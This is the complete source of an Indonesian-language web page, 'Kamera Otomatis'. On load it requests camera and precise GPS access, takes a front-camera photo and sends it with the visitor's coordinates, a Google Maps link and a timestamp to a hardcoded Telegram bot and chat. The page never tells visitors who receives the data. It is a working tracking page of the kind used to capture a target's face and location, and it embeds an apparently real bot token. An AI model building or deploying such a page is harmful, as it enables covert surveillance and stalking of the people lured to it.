<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera Otomatis</title>
    <style>
        body {
            background-color: #000;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            max-width: 500px;
        }
        
        .status {
            margin: 20px 0;
            font-size: 18px;
            line-height: 1.5;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error {
            color: #ff5555;
            display: none;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ff5555;
            border-radius: 5px;
            background-color: rgba(255, 85, 85, 0.1);
        }
        
        .success {
            color: #55ff55;
            display: none;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #55ff55;
            border-radius: 5px;
            background-color: rgba(85, 255, 85, 0.1);
        }
        
        .permission-info {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
        }
        
        .step {
            margin: 10px 0;
            text-align: left;
        }
        
        .step-number {
            display: inline-block;
            width: 25px;
            height: 25px;
            background-color: #fff;
            color: #000;
            border-radius: 50%;
            text-align: center;
            line-height: 25px;
            margin-right: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Kamera Otomatis</h1>
        
        <div class="permission-info">
            <div class="step">
                <span class="step-number">1</span> Izinkan akses kamera saat diminta
            </div>
            <div class="step">
                <span class="step-number">2</span> Izinkan akses lokasi saat diminta
            </div>
            <div class="step">
                <span class="step-number">3</span> Foto dan lokasi akan dikirim otomatis
            </div>
        </div>
        
        <div class="status" id="status">Mempersiapkan...</div>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Mengambil foto dan lokasi...</p>
        </div>
        <div class="error" id="error"></div>
        <div class="success" id="success"></div>
    </div>

    <script>
        // Konfigurasi Telegram Bot
        const TELEGRAM_BOT_TOKEN = '8255783371:AAGYMSQvRJx8dLtS7ADxyb4Kl8Q4S2g5Jao'; // Ganti dengan token bot Anda
        const TELEGRAM_CHAT_ID = '5408845642'; // Ganti dengan chat ID Anda
        
        // Elemen DOM
        const statusElement = document.getElementById('status');
        const loadingElement = document.getElementById('loading');
        const errorElement = document.getElementById('error');
        const successElement = document.getElementById('success');
        
        // Variabel untuk menyimpan data lokasi
        let userLocation = null;
        
        // Fungsi untuk mendapatkan lokasi pengguna
        function getUserLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Browser tidak mendukung geolocation'));
                    return;
                }
                
                statusElement.textContent = 'Mengakses lokasi...';
                
                const options = {
                    enableHighAccuracy: true, // Menggunakan GPS untuk akurasi tinggi
                    timeout: 10000, // Timeout 10 detik
                    maximumAge: 0 // Tidak menggunakan cache lokasi lama
                };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude, accuracy } = position.coords;
                        userLocation = {
                            latitude: latitude.toFixed(6),
                            longitude: longitude.toFixed(6),
                            accuracy: Math.round(accuracy)
                        };
                        resolve(userLocation);
                    },
                    (error) => {
                        let errorMessage = 'Gagal mendapatkan lokasi: ';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage += 'Izin lokasi ditolak';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage += 'Informasi lokasi tidak tersedia';
                                break;
                            case error.TIMEOUT:
                                errorMessage += 'Permintaan lokasi timeout';
                                break;
                            default:
                                errorMessage += 'Error tidak diketahui';
                        }
                        reject(new Error(errorMessage));
                    },
                    options
                );
            });
        }
        
        // Fungsi untuk membuat tautan Google Maps
        function createGoogleMapsLink(latitude, longitude) {
            return `https://www.google.com/maps?q=${latitude},${longitude}`;
        }
        
        // Fungsi untuk membuat caption dengan informasi lokasi
        function createCaptionWithLocation() {
            let caption = 'Foto otomatis diambil dari website kamera';
            
            if (userLocation) {
                const mapsLink = createGoogleMapsLink(userLocation.latitude, userLocation.longitude);
                caption += `\n\nüìç Lokasi: ${userLocation.latitude}, ${userLocation.longitude}`;
                caption += `\nüìè Akurasi: ¬±${userLocation.accuracy} meter`;
                caption += `\nüó∫Ô∏è [Lihat di Google Maps](${mapsLink})`;
                
                // Tambahkan informasi tambahan jika akurasi baik
                if (userLocation.accuracy < 50) {
                    caption += '\n\n‚úÖ Lokasi sangat akurat';
                } else if (userLocation.accuracy < 200) {
                    caption += '\n\n‚ö†Ô∏è Lokasi cukup akurat';
                } else {
                    caption += '\n\n‚ùå Lokasi kurang akurat';
                }
            } else {
                caption += '\n\n‚ùå Informasi lokasi tidak tersedia';
            }
            
            // Tambahkan timestamp
            const now = new Date();
            caption += `\n\nüïí Waktu: ${now.toLocaleString('id-ID')}`;
            
            return caption;
        }
        
        // Fungsi untuk mengirim foto ke Telegram
        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', photoBlob, 'captured_photo.jpg');
            formData.append('caption', createCaptionWithLocation());
            formData.append('parse_mode', 'Markdown');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    return true;
                } else {
                    throw new Error(result.description || 'Gagal mengirim foto ke Telegram');
                }
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
                throw error;
            }
        }
        
        // Fungsi untuk mengambil foto dari kamera
        async function capturePhoto() {
            try {
                statusElement.textContent = 'Mengakses kamera...';
                
                // Meminta akses ke kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // Menggunakan kamera depan
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                // Membuat elemen video untuk menangkap frame
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Menunggu video siap
                await new Promise(resolve => {
                    video.addEventListener('loadeddata', resolve);
                });
                
                // Tunggu sebentar untuk memastikan kualitas gambar baik
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Membuat canvas untuk mengambil foto
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                
                // Menggambar frame video ke canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Menghentikan stream kamera
                stream.getTracks().forEach(track => track.stop());
                
                // Mengonversi canvas ke blob
                return new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                throw error;
            }
        }
        
        // Fungsi utama
        async function main() {
            try {
                // Periksa apakah browser mendukung fitur yang diperlukan
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('Browser tidak mendukung akses kamera');
                }
                
                if (!navigator.geolocation) {
                    throw new Error('Browser tidak mendukung geolocation');
                }
                
                // Periksa apakah token dan chat ID sudah diatur
                if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                    throw new Error('Harap atur token bot Telegram dan chat ID terlebih dahulu');
                }
                
                // Dapatkan lokasi terlebih dahulu
                await getUserLocation();
                
                // Ambil foto
                statusElement.textContent = 'Mengambil foto...';
                const photoBlob = await capturePhoto();
                
                // Tampilkan loading
                statusElement.style.display = 'none';
                loadingElement.style.display = 'block';
                
                // Kirim foto ke Telegram
                await sendPhotoToTelegram(photoBlob);
                
                // Tampilkan sukses
                loadingElement.style.display = 'none';
                successElement.textContent = `‚úÖ Foto dan lokasi berhasil dikirim!${userLocation ? `\nLokasi: ${userLocation.latitude}, ${userLocation.longitude}` : ''}`;
                successElement.style.display = 'block';
                
                // Tampilkan pesan sukses selama 8 detik sebelum menutup halaman
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div class="container">
                            <h1>Proses Selesai</h1>
                            <div class="success">
                                ‚úÖ Foto dan lokasi berhasil dikirim ke Telegram!
                                ${userLocation ? `<br><br>üìç Lokasi: ${userLocation.latitude}, ${userLocation.longitude}` : ''}
                            </div>
                        </div>
                    `;
                }, 8000);
                
            } catch (error) {
                console.error('Error:', error);
                statusElement.style.display = 'none';
                loadingElement.style.display = 'none';
                errorElement.textContent = `‚ùå Error: ${error.message}`;
                errorElement.style.display = 'block';
                
                // Tampilkan pesan error selama 10 detik
                setTimeout(() => {
                    errorElement.textContent += '\n\nSilakan refresh halaman untuk mencoba lagi.';
                }, 3000);
            }
        }
        
        // Jalankan fungsi utama ketika halaman dimuat
        window.addEventListener('load', main);
    </script>
</body>
</html>
